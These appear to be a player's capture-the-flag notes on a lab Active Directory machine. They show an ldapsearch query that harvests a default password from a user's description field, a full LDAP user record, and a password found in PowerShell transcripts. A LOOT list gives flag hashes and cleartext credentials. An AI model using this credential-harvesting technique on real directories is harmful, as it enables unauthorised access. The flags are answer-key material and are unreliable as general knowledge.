# Enumeration
- DOMAIN
`FROM NMAP RESULT MEGABANK.LOCAL is the domain but NC 88 KERBEROS is sending MEGABANK.HTB.LOCAL
- USERS
Found 1 user password using:
`ldapsearch -h 10.10.10.169 -x -LLL -b 'DC=MEGABANK,DC=LOCAL' -s sub 'objectClass=user' | grep -i pass`
this query returns 1 users description was set to
`Account created. Password set to Welcome123!`
and user is:
`dn: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Marko Novak
sn: Novak
description: Account created. Password set to Welcome123!
givenName: Marko
distinguishedName: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,D
 C=local
instanceType: 4
whenCreated: 20190927131714.0Z
whenChanged: 20191203132427.0Z
displayName: Marko Novak
uSNCreated: 13110
uSNChanged: 69792
name: Marko Novak
objectGUID:: 8oIRSXQNmEW4iTLjzuwCpw==
userAccountControl: 66048
badPwdCount: 10
codePage: 0
countryCode: 0
badPasswordTime: 132317539165593453
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132140638345690606
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHWVwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: marko
sAMAccountType: 805306368
userPrincipalName: marko@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 20190927221048.0Z
dSCorePropagationData: 20190927131714.0Z
dSCorePropagationData: 16010101000001.0Z
`
the Welcome123! password was not password for marko but melanie had Welcome123! password set
Next on C:\ Directory used `dir -force` command which will give hidden file list equivalent to `ls -lah`
there is wierd directory PSTranscripts which contains powershell script output. From there i have found ryan user password `Serv3r4Admin4cc123!`
# LOOT
user : 0c3be45fcfe249796ccbee8d3a978540
root : e1d94876a506850d0c20edb5405e619c
melanie:Welcome123!
ryan:Serv3r4Admin4cc123!
